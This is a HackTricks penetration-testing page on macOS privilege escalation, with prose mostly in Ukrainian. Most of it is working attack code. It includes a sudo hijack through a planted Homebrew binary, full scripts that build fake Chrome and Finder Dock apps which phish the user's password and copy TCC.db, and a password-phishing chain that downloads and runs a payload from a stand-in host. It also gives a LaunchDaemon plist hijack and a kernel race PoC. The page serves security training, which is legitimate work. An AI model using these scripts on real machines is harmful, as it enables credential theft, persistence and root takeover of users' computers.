# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Якщо ви прийшли сюди в пошуках TCC privilege escalation, перейдіть до:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Зверніть увагу, що **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** машини. Тому дивіться:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Взаємодія з користувачем

### Sudo Hijacking

You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Однак macOS **maintains** користувацький **`PATH`** під час виконання **`sudo`**. Це означає, що інший спосіб реалізувати цю атаку — **hijack other binaries**, які жертва буде виконувати під час **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Зверніть увагу, що користувач, який використовує термінал, швидше за все матиме встановлений **Homebrew**. Тому можливо перехопити бінарники в **`/opt/homebrew/bin`**.

### Імітація Dock

Використовуючи певну **social engineering**, ви можете **імітувати, наприклад, Google Chrome** у Dock і фактично виконати власний скрипт:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Декілька порад:

- Перевірте в Dock, чи є Chrome, і в такому випадку **видаліть** цей запис та **додайте** **підробний** **запис Chrome у тій самій позиції** в масиві Dock.

<details>
<summary>Скрипт імітації Chrome у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Деякі поради:

- Ви **не можете видалити Finder з Dock**, тому якщо ви збираєтеся додати його до Dock, ви можете розмістити підроблений Finder поруч зі справжнім. Для цього потрібно **додати запис підробленого Finder на початок Dock array**.
- Інший варіант — не розміщувати його в Dock, а просто відкрити; «Finder просить контролювати Finder» не виглядає надто дивно.
- Ще один спосіб, щоб **escalate to root without asking** пароль через огидне вікно — змусити Finder дійсно запросити пароль для виконання привілейованої дії:
- Попросіть Finder скопіювати в **`/etc/pam.d`** новий файл **`sudo`** (The prompt asking for the password will indicate that "Finder wants to copy sudo")
- Попросіть Finder скопіювати новий **Authorization Plugin** (You could control the file name so the prompt asking for the password will indicate that "Finder wants to copy Finder.bundle")

<details>
<summary>Скрипт підроблення Finder у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware frequently abuses user interaction to **перехопити пароль, придатний для sudo** and reuse it programmatically. A common flow:

1. Визначити залогіненого користувача за допомогою `whoami`.
2. **Повторювати запити пароля** поки `dscl . -authonly "$user" "$pw"` не поверне успіх.
3. Закешувати облікові дані (наприклад, `/tmp/.pass`) і виконувати привілейовані дії через `sudo -S` (пароль через stdin).

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Вкрадений пароль потім можна повторно використати, щоб **очистити карантин Gatekeeper за допомогою `xattr -c`**, скопіювати LaunchDaemons або інші привілейовані файли та запустити додаткові стадії без взаємодії з користувачем.

## Новіші специфічні для macOS вектори (2023–2025)

### Застаріла `AuthorizationExecuteWithPrivileges` все ще працює

`AuthorizationExecuteWithPrivileges` було оголошено застарілим у 10.7, але **все ще працює на Sonoma/Sequoia**. Багато комерційних оновлювачів викликають `/usr/libexec/security_authtrampoline`, передаючи ненадійний шлях. Якщо цільовий бінарний файл доступний для запису користувачем, ви можете підкласти trojan і скористатися легітимним запитом авторизації:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Поєднайте з **masquerading tricks above**, щоб показати правдоподібний діалог запиту пароля.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Якщо LaunchDaemon plist або його ціль `ProgramArguments` є **user-writable**, ви можете підвищити привілеї, замінивши його та змусивши launchd перезавантажитися:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Це віддзеркалює шаблон експлойта, опублікований для **CVE-2025-24085**, де writable plist було використано для виконання attacker code as root.

### XNU SMR credential race (CVE-2025-24118)

Гонка в `kauth_cred_proc_update` дозволяє локальному зловмиснику пошкодити покажчик облікових даних тільки для читання (`proc_ro.p_ucred`) шляхом змагання `setgid()`/`getgid()` циклів між потоками до виникнення torn `memcpy`. Успішне пошкодження дає **uid 0** та доступ до kernel memory. Мінімальна структура PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Поєднайте з heap grooming, щоб розмістити контрольовані дані там, де вказівник читається повторно. На вразливих збірках це надійний **local kernel privesc** без необхідності SIP bypass.

### SIP bypass через Migration Assistant ("Migraine", CVE-2023-32369)

Якщо ви вже маєте root, SIP все ще блокує записи у системні локації. Баг **Migraine** зловживає правом Migration Assistant `com.apple.rootless.install.heritable`, щоб створити дочірній процес, який успадковує SIP bypass і перезаписує захищені шляхи (наприклад, `/System/Library/LaunchDaemons`). Послідовність:

1. Отримати root на живій системі.
2. Тригернути `systemmigrationd` зі спеціально сформованим станом, щоб виконати бінар, контрольований атакуючим.
3. Використати успадковане entitlement для модифікації SIP-захищених файлів, що зберігаються навіть після перезавантаження.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Кілька демонів Apple приймають **NSPredicate** об'єкти через XPC і перевіряють лише поле `expressionType`, яким може керувати атакуючий. Створивши predicate, який оцінює довільні селектори, можна досягти **code execution in root/system XPC services** (наприклад, `coreduetd`, `contextstored`). У поєднанні з початковим app sandbox escape це дає **privilege escalation without user prompts**. Шукайте XPC endpoints, які десеріалізують predicates і не мають надійного visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (навіть без привілеїв) може створити і змонтувати Time Machine snapshot та **access ALL the files** цього snapshot'а.\
The **only privileged** потрібне — щоб застосунок, який використовується (наприклад, `Terminal`), мав **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), яке має надати адміністратор.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Більш детальне пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Чутлива інформація

Це може бути корисним для підвищення привілеїв:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Посилання

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
